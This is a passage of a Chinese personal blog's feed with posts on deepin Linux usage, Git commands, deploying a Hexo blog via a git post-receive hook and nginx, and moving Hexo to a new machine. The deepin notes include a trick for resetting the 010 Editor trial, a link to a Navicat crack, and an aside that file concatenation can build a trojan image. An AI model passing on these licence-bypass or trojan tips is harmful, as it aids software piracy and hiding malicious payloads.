    <summary type="html">&lt;h1&gt;题目描述&lt;/h1&gt;
&lt;p&gt;给定一个n*m的矩阵A，求A中的一个非空子矩阵，使这个子矩阵中的元素和最大。&lt;/p&gt;
&lt;p&gt;其中，A的子矩阵指在A中行和列均连续的一块。&lt;/p&gt;
&lt;p&gt;样例说明&lt;br&gt;
取最后一列，和为10。&lt;br&gt;
数据规模和约定&lt;br&gt;
对于100%的数据，</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>deepin使用记录</title>
    <link href="https://zss192.github.io/2020/10/28/deepin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://zss192.github.io/2020/10/28/deepin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2020-10-28T06:59:00.000Z</published>
    <updated>2021-03-30T03:45:21.149Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面</h1><p>这些笔记为我在用deepin 15.11时总结的一些知识点。包括一些技巧还有遇到的一些问题及解决方法。文章长期更新，希望能帮助到有需要的小伙伴。</p><h1>目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin 可执行文件，可在终端输入即可执行</span><br><span class="line">&#x2F;etc  配置文件</span><br><span class="line">&#x2F;home    除root用户的其他用户的家目录</span><br><span class="line">&#x2F;tmp     临时文件，系统运行时产生的临时文件</span><br><span class="line">&#x2F;mnt     外接设备需要挂载时，就挂在在这个目录</span><br><span class="line">&#x2F;opt 用户自己下载的应用存在这(个人习惯)</span><br></pre></td></tr></table></figure><h1>常用命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rsync -avzPr 源文件 目标文件//快速复制大文件</span><br><span class="line">cat test1.txt test2.txt &gt; test.txt //合并test1和test2到<span class="built_in">test</span>,比如可制作马</span><br><span class="line">df -h//以较高可读性查看磁盘空间</span><br><span class="line">管道 |：ls / | grep abc//查询根目录下包含“abc”的文件，后面是在前面输出的基础上过滤的</span><br><span class="line">top //动态展示进程占得资源，按M(MEM)表示按内存从高到低排列，P表示按CPU使用率从高到低排列</span><br><span class="line">find 路径范围 -name 文件名称  //如find /etc -name *.conf</span><br><span class="line">ps -ef//查看进程信息，如查询appache的httpd服务是否开启，ps -ef | grep httpd</span><br><span class="line">service 服务名 start/stop/restart//如service httpd start</span><br><span class="line"><span class="built_in">kill</span> -9 进程id//如<span class="built_in">kill</span> 29867,进程id可通过top或ps -ef获得</span><br><span class="line">killall 进程名称//如killall httpd</span><br><span class="line">ifconfig//常用于查看ip信息，不一定只有两个</span><br><span class="line">man 指令名//用于查询某指令的用法，如man mv</span><br><span class="line">tar -zxvf 压缩包//解压压缩包</span><br><span class="line">sudo dpkg -i test.deb//安装deb包</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:12333&quot;</span>//终端暂时使用代理(推荐用proxychains)</span><br><span class="line">chown -R 用户名 文件夹//更改指定文件夹下所有文件所有者，</span><br><span class="line">zip -r myFile.zip ./*  //将当前所有文件压缩成zip包</span><br></pre></td></tr></table></figure><h1>使用技巧</h1><ul><li><p>使用<strong>Ctrl+u删除光标前所有内容</strong>，Ctrl+k删除光标后所有内容</p></li><li><p>rm ~/.config/SweetScape/010\ Editor.ini  可无限试用010editor</p></li><li><p>Navicat15破解：<a href="https://www.yuque.com/fank243/devops/crzwuq">点我查看</a></p></li><li><p><sub>/.local/share/applications/wine/Programs/下rm掉多余的wine软件菜单项，再到</sub>/.config/menus/applications-merged/下去清理多余的垃圾。</p></li><li><p>crontab可定时执行脚本</p></li><li><p>安装mysql:<a href="https://wangxin1248.github.io/linux/2018/07/ubuntu18.04-install-mysqlserver.html">https://wangxin1248.github.io/linux/2018/07/ubuntu18.04-install-mysqlserver.html</a></p></li><li><p>终端暂时使用代理 proxychains + 命令</p></li><li><p>格式化U盘为ext4格式(timeshift备份到U盘)</p><ul><li><p># 该命令查看你的设备<br>lsblk -f</p><p># 卸载U盘</p><p>umount 你的U盘设备(如/dev/sdb1)</p><p># 格式化成ext4格式<br>mkfs.ext4 你的U盘设备(如/dev/sdb1)，之后等就行了</p></li></ul></li><li><p>浏览器快捷键：</p><p><strong>Ctrl + L</strong>   地址栏搜索</p><p><strong>Ctrl + T</strong>   打开新标签页；</p><p><strong>Ctrl + W</strong>  关闭当前标签页；</p><p><strong>Ctrl + Shift + W</strong>  关闭整个浏览器</p><p><strong>Ctrl + 数字键 1 至 8</strong> 可以按标签页顺序定位；</p><p><strong>空格键</strong> 可以向下滚动网页，<strong>Shift + 空格键</strong> 则是向上。</p></li></ul><h1>常见问题解决方案</h1><p>1.将一个py文件添加到bash直接在终端输入不用切换到想用目录</p><p>ln -s /opt/tools/dirsearch/dirsearch.py /bin/dirsearch   //在终端输入dirsearch即可运行这个py文件</p><p>2.deepin中默认的编辑器用dedit(ded按tab即可)</p><p>3.普通用户使用sudo免密码：dedit /etc/sudoers 修改your_user_name ALL=(ALL) NOPASSWD: ALL</p><p>4.sudoers文件修改错误导致无法使用sudo：pkexec 代替sudo更改sudoers文件</p><p>5.为bat文件创建含图标快捷方式：在/usr/bin下创建如burpsuite把bat文件复制粘贴(注意路径换成绝对路径)，这样就可在命令行直接运行bat文件，然后用桌面文件创建工具创建快捷方式即可</p><p>6.运行wine报错程序错误：删除~/.wine目录，然后运行winecfg（会重新生成.wine）</p><p>7.安装wine-mono和wine-gecko可去官网：<a href="https://dl.winehq.org/wine/%E5%AE%89%E8%A3%85msi%E6%96%87%E4%BB%B6%EF%BC%8C%E7%A7%BB%E5%8A%A8%E5%88%B0/home/%E7%94%A8%E6%88%B7%E5%90%8D/.wine%E7%9B%AE%E5%BD%95%E4%B8%8B">https://dl.winehq.org/wine/安装msi文件，移动到/home/用户名/.wine目录下</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine  msiexec /i  wine-mono-4.9.4.msi  //例如安装wine-mono</span><br></pre></td></tr></table></figure><p>8.qq无法加载图片</p><p>关闭ipv6</p><p>9.tmp下的mysql.sock文件被删，导致navicat打不开本地数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/<span class="built_in">local</span>/mysql/support-files/mysql.server start  //启动mysql，重新生成mysql.sock文件</span><br></pre></td></tr></table></figure><p>10.若有时pip安装失败可尝试在加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i http://pypi.douban.com/simple/ --trusted-host [pypi.douban.com](http://pypi.douban.com/)</span><br></pre></td></tr></table></figure><p>11.鼠标变成十字架，无法使用鼠标</p><p>原因：在shell终端误输入了import命令</p><p>解决方法：ps -aux | grep import    找到对应pid,kill -9 pid 即可</p><p>12.运行py文件鼠标变十字架，无法使用鼠标</p><p>打开py文件，在最上方加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3     //指定由哪个解释器来执行脚本</span></span><br></pre></td></tr></table></figure><p>原因：python2和python3不兼容，加上这个就在输入./test.py默认由python3执行</p><p>13.应用选择默认程序页面没有我们想要的应用</p><p>打开/usr/share/applications找到比如typora</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加一行 MimeType&#x3D;*&#x2F;*  即可</span><br></pre></td></tr></table></figure><p>14.telegram不要使用2.1.5的版本会出现无法输入中文的问题，使用2.1.4即可解决</p><p>15.更新最新版的QQ：将Windows的C:\Program Files (x86)\Tencent\QQ\下的文件覆盖~/.deepinwine/Deepin-QQ/drive_c/Program\ Files/Tencent/QQ/即可（先备份）</p><p>16.npm太慢可以用cnpm（镜像，第一次用要下载）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>以后都可以用cnpm代替npm了</p><p>17.百度网盘无法登录</p><p>编辑百度网盘的图标把Exec内容前加上sudo(用管理员身份打开)</p><p>如果用的UTools，修改过图标后重启，UTools里打开才是修改后的</p><p>18.解决QQ崩溃问题(可减少崩溃次数)：</p><p>替换dwrite.dll，<a href="https://bbs.deepin.org/forum.php?mod=attachment&amp;aid=OTg1MTJ8NjBlYzc3NTB8MTYwMTEwMzQxNnwwfDE5NjE4OQ%3D%3D">点我下载</a>，解压后重命名为dwrite.dll然后替换~/.wine/drive_c/windows/system32/下的dwrite.dll。</p><p>之后在winecfg里面设置函数库添加dwrite，同时模拟windows版本只能设置成xp</p><p>19.无法弹出U盘(有程序正在使用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df -h查看挂载点，例如&#x2F;dev&#x2F;sdb1</span><br><span class="line">sudo fuser -mv &#x2F;dev&#x2F;sdb1查看U盘的uid，杀死这个进程</span><br><span class="line">kill -9进程号</span><br><span class="line">正常弹出U盘即可</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;这些笔记为我在用deepin 15.11时总结的一些知识点。包括一些技巧还有遇到的一些问题及解决方法。文章长期更新，希望能帮助到有需要的小伙伴。&lt;/p&gt;
&lt;h1&gt;目录结构&lt;/h1&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="https://zss192.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://zss192.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Git使用方法</title>
    <link href="https://zss192.github.io/2020/10/16/Git%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>https://zss192.github.io/2020/10/16/Git%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2020-10-16T13:45:00.000Z</published>
    <updated>2021-03-30T03:45:21.149Z</updated>
    
    <content type="html"><![CDATA[<h1>常用代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init    &#x2F;&#x2F;初始化仓库,若是用的clone则不需要这步</span><br><span class="line">git config --global user.name &quot;账户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱号&quot;</span><br><span class="line">git config --global --list&#x2F;&#x2F;查看全局配置(设置的邮箱等)</span><br><span class="line">git remote add origin 远程库地址 &#x2F;&#x2F;关联到远程库</span><br><span class="line"></span><br><span class="line">日常使用步骤</span><br><span class="line">git add .&#x2F;&#x2F;把文件添加到版本库中</span><br><span class="line">git commit -m &quot;test&quot;&#x2F;&#x2F;把文件提交到仓库。引号内为提交说明</span><br><span class="line">git pull origin master&#x2F;&#x2F;把远程仓库的master分之拉到本地</span><br><span class="line">git push origin master&#x2F;&#x2F;把本地文件推到远程仓库master分支</span><br></pre></td></tr></table></figure><h1>速查表</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/c3564e1d2318110e06be04b97fdf8fd0.png"  alt="img"></p><h1>注意事项</h1><p>1.不到万不得已不要使用强制提交(问就是曾和学长一起开发系统用过，然后把更新记录全部覆盖了，虽然代码没什么大改动，但是提交记录被全部覆盖不利于后期维护)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --force origin master　如果本地比远程仓库版本低，会提醒先git pull更新，但仍要坚持提交可用这个强制提交</span><br></pre></td></tr></table></figure><p>2.github添加了ssh密钥使用ssh -T git@github.com测试报错？</p><p>事实证明重启即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;常用代码&lt;/h1&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;</summary>
      
    
    
    
    <category term="日常办公" scheme="https://zss192.github.io/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
    <category term="日常办公" scheme="https://zss192.github.io/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客部署到服务器</title>
    <link href="https://zss192.github.io/2020/10/15/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://zss192.github.io/2020/10/15/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-10-15T05:14:00.000Z</published>
    <updated>2021-03-30T03:45:21.149Z</updated>
    
    <content type="html"><![CDATA[<h1>准备工作</h1><ul><li>本地hexo已配置好</li><li>个人系统：deepin15.11</li><li>服务器：Ubuntu 18.04</li></ul><h1>开始吧</h1><h2 id="安装git和nginx"><a class="header-anchor" href="#安装git和nginx">¶</a>安装git和nginx</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install git nginx</span><br></pre></td></tr></table></figure><h2 id="配置nginx"><a class="header-anchor" href="#配置nginx">¶</a>配置nginx</h2><p><strong>nginx version: nginx/1.14.0 (Ubuntu)</strong></p><blockquote><p>在此说明nginx版本是因为我曾试了网上很多nginx配置但都没生效(原谅我只用过Apache)，后来搜了具体版本的配置才生效。所以日后还是要养成搜的时候加上版本的习惯。</p></blockquote><p>我的博客目录在/opt/hexo</p><p>当然你也可以自己设置，之后的步骤里更换成你的目录就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/hexo</span><br></pre></td></tr></table></figure><p>编写 nginx 配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 ;</span><br><span class="line">        root /opt/hexo;</span><br><span class="line">        index index.html index.htm index.nginx-debian.html;</span><br><span class="line">        server_name 47.93.34.7; #有域名就填域名，也可填服务器公网ip</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><p>这个时候我们已经把默认站点更换为/opt/hexo，你可以在相应目录下新建一个文件访问ip查看是否生效。</p><h2 id="配置-Git-Hooks"><a class="header-anchor" href="#配置-Git-Hooks">¶</a>配置 Git Hooks</h2><h3 id="创建-Git-裸仓库"><a class="header-anchor" href="#创建-Git-裸仓库">¶</a>创建 Git 裸仓库</h3><p><strong>blog.git</strong>作为远程 Git 仓库，Hexo 在本地生成的博客静态文件可以通过 push 与其同步。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/blog.git &amp;&amp; cd ~/blog.git</span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure><h3 id="配置-Hooks-脚本"><a class="header-anchor" href="#配置-Hooks-脚本">¶</a>配置 Hooks 脚本</h3><p><strong>post-receive</strong>脚本将在<strong>blog.git</strong>仓库接收到 push 时执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ./hooks/post-receive</span><br></pre></td></tr></table></figure><p>脚本非常简单，删除原有的**/opt/hexo目录，然后从<strong>blog.git</strong>仓库 clone 新的博客静态文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">rm -rf /opt/hexo</span><br><span class="line">git clone /root/blog.git /opt/hexo</span><br></pre></td></tr></table></figure><p>给<strong>post-receive</strong>脚本执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x .&#x2F;hooks&#x2F;post-receive</span><br></pre></td></tr></table></figure><h2 id="修改本地文件"><a class="header-anchor" href="#修改本地文件">¶</a>修改本地文件</h2><p>修改本地博客根目录下的_config.yml</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repo: root@你的公网ip:blog.git</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20201014235835414.png"  alt="image-20201014235835414"></p><h2 id="免密推送代码"><a class="header-anchor" href="#免密推送代码">¶</a>免密推送代码</h2><p>前提是本地有ssh密钥(可用cat ~/.ssh/id_rsa.pub查看是否存在)</p><p>若没有ssh密钥则要生成ssh key，按3个回车即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>然后把公钥推到服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub | ssh [username]@[remote_host] <span class="string">&quot;mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：cat ~&#x2F;.ssh&#x2F;id_rsa.pub | ssh root@47.93.34.7 &quot;mkdir -p ~&#x2F;.ssh &amp;&amp; cat &gt;&gt; ~&#x2F;.ssh&#x2F;authorized_keys&quot;</span><br></pre></td></tr></table></figure><h2 id="部署博客"><a class="header-anchor" href="#部署博客">¶</a>部署博客</h2><p>在本地博客根目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><p>访问公网ip即可看到博客，若是配置的域名不要忘了去解析域名(注意端口是否开放)。</p><h1>写在最后</h1><p>以上就是hexo博客部署到服务器上的全部过程，之所以写这篇博客是之前白嫖了个服务器部署了博客，过期之后我又买了个服务器还得去搜相关操作比较麻烦。</p><p>在此记录下相关操作方便日后需要。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;准备工作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;本地hexo已配置好&lt;/li&gt;
&lt;li&gt;个人系统：deepin15.11&lt;/li&gt;
&lt;li&gt;服务器：Ubuntu 18.04&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;开始吧&lt;/h1&gt;
&lt;h2 id=&quot;安装git和nginx&quot;&gt;&lt;a class=</summary>
      
    
    
    
    <category term="日常办公" scheme="https://zss192.github.io/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
    <category term="日常办公" scheme="https://zss192.github.io/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>hexo迁移至新电脑</title>
    <link href="https://zss192.github.io/2020/10/12/hexo%E8%BF%81%E7%A7%BB%E8%87%B3%E6%96%B0%E7%94%B5%E8%84%91/"/>
    <id>https://zss192.github.io/2020/10/12/hexo%E8%BF%81%E7%A7%BB%E8%87%B3%E6%96%B0%E7%94%B5%E8%84%91/</id>
    <published>2020-10-12T11:18:00.000Z</published>
    <updated>2021-03-30T03:45:21.149Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面</h1><p>由于想在实验室电脑上也可以用hexo更新博客，特此记录下相关操作</p><p>相关配置：</p><ul><li>系统：deepin15.11</li><li>已配置好git</li></ul><h1>安装 node、npm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装 nodejs和npm </span><br><span class="line">sudo apt install node</span><br><span class="line"></span><br><span class="line">检测是否安装好</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><h1>拷贝文件</h1><p>将原来的博客文件拷贝过来即可，例如我的文件件如下所示</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20201012190547411.png"  alt="image-20201012190547411"></p><h1>安装hexo和相关模块</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install -g hexo</span><br><span class="line">sudo npm install</span><br></pre></td></tr></table></figure><p>接下来就可正常使用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  &#x2F;&#x2F;清除缓存</span><br><span class="line">hexo g  &#x2F;&#x2F;生成静态文件</span><br><span class="line">hexo d    &#x2F;&#x2F;推到远程仓库</span><br></pre></td></tr></table></figure><h1>可能遇到的问题</h1><p>我在用hexo d的时候一直提示权限不足。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20201012191145211.png"  alt="image-20201012191145211"></p><p>但我github已经添加了SSH密钥，一番检查后发现我的远程仓库不仅有github还有coding，虽然添加了github的SSH密钥，但没添加coding的，导致一直提示权限不足。查看远程仓库在根目录下的_config.yml</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20201012191431834.png"  alt="image-20201012191431834"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;由于想在实验室电脑上也可以用hexo更新博客，特此记录下相关操作&lt;/p&gt;
&lt;p&gt;相关配置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统：deepin15.11&lt;/li&gt;
&lt;li&gt;已配置好git&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装 node、npm&lt;/h1&gt;
</summary>
      
    
    
    
    <category term="日常办公" scheme="https://zss192.github.io/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
    <category term="日常办公" scheme="https://zss192.github.io/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
</feed>
